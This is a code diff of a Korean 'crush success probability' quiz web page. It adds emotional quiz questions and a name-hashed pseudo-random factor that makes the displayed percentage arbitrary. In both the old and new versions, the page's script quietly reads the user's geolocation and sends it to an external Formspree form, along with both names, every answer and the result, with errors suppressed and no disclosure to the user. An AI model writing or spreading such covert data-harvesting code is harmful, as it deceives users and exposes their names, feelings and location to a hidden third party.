@@ -51,6 +51,7 @@
     <label>짝사랑 상대 이름:</label>
     <input type="text" id="crushName" required>
 
+    <!-- 기본 질문 6개 -->
     <div class="question">
       <label>1️⃣ 상대방과 얼마나 자주 대화하나요?</label>
       <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
@@ -98,6 +99,39 @@
       <label><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요 😊</label>
       <label><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요 💕</label>
     </div>
+
+    <!-- 감정형 추가 질문 7~10 -->
+    <div class="question">
+      <label>7️⃣ 연락이 오면 너무 기쁘고, 안 오면 하루 종일 신경 쓰인다.</label>
+      <label><input type="radio" name="q7" value="20"> 전혀 그렇지 않아요</label>
+      <label><input type="radio" name="q7" value="50"> 가끔 그래요</label>
+      <label><input type="radio" name="q7" value="80"> 자주 그래요</label>
+      <label><input type="radio" name="q7" value="100"> 항상 그래요 💌</label>
+    </div>
+
+    <div class="question">
+      <label>8️⃣ 그 사람과 눈이 마주치기만 해도 심장이 뛴다.</label>
+      <label><input type="radio" name="q8" value="20"> 별로 안 그래요</label>
+      <label><input type="radio" name="q8" value="50"> 가끔 그래요</label>
+      <label><input type="radio" name="q8" value="80"> 꽤 그래요</label>
+      <label><input type="radio" name="q8" value="100"> 완전 그래요 💓</label>
+    </div>
+
+    <div class="question">
+      <label>9️⃣ 그 사람 주변 이성 친구들을 보면 질투가 난다.</label>
+      <label><input type="radio" name="q9" value="20"> 전혀 안 그래요</label>
+      <label><input type="radio" name="q9" value="50"> 조금 그래요</label>
+      <label><input type="radio" name="q9" value="80"> 자주 그래요</label>
+      <label><input type="radio" name="q9" value="100"> 너무 질투나요 😣</label>
+    </div>
+
+    <div class="question">
+      <label>🔟 '혹시 나를 좋아하는 건 아닐까?' 하는 상상을 해본 적이 있다.</label>
+      <label><input type="radio" name="q10" value="20"> 그런 생각 전혀 안 해봤어요</label>
+      <label><input type="radio" name="q10" value="50"> 가끔 해요</label>
+      <label><input type="radio" name="q10" value="80"> 자주 그런 상상을 해요</label>
+      <label><input type="radio" name="q10" value="100"> 맨날 그래요 😳</label>
+    </div>
     
     <button type="submit">결과 보기</button>
   </form>
@@ -112,9 +146,12 @@
       const crushName = document.getElementById("crushName").value.trim();
       const resultBox = document.getElementById("result");
 
-      if (!yourName || !crushName) return;
+      if (!yourName || !crushName) {
+        resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
+        return;
+      }
 
-      const questions = ['q1', 'q2', 'q3', 'q4', 'q5', 'q6'];
+      const questions = ['q1','q2','q3','q4','q5','q6','q7','q8','q9','q10'];
       let total = 0, answered = 0;
       let answers = {};
 
@@ -129,10 +166,18 @@
         }
       }
 
-      if (answered < questions.length) return;
+      if (answered < questions.length) {
+        resultBox.innerText = "⚠️ 모든 질문에 답해주세요!";
+        return;
+      }
+
+      // 이름별 고정 확률을 위한 해시 기반 난수
+      const baseSeed = (yourName + crushName).split('')
+        .reduce((acc, char) => acc + char.charCodeAt(0), 0);
+      const fixedRandom = Math.abs(Math.sin(baseSeed)) * 10;
 
       const average = total / questions.length;
-      const percent = Math.round(average);
+      const percent = Math.round((average + fixedRandom) / 2);
 
       let message = "";
       if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
@@ -141,15 +186,15 @@
       else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
 
       resultBox.innerHTML = `
-        💖 <b>${crushName}</b>이(가) <b>${yourName}</b>을(를) 좋아할 확률은<br>
+        💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
         <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
       `;
 
-      // ✅ 위치 정보 가져오기 (알림 메시지 없이)
+      // 위치 정보 가져오기
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
+        navigator.geolocation.getCurrentPosition((position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
           fetch("https://formspree.io/f/xanegwav", {
             method: "POST",
@@ -165,20 +210,6 @@
             })
           }).catch(() => {});
         });
-      } else {
-        // 위치 기능이 없어도 그냥 조용히 통과
-        fetch("https://formspree.io/f/xanegwav", {
-          method: "POST",
-          headers: { "Accept": "application/json", "Content-Type": "application/json" },
-          body: JSON.stringify({
-            yourName,
-            crushName,
-            percent,
-            resultMessage: message,
-            answers,
-            location: "not available"
-          })
-        }).catch(() => {});
       }
     });
   </script>
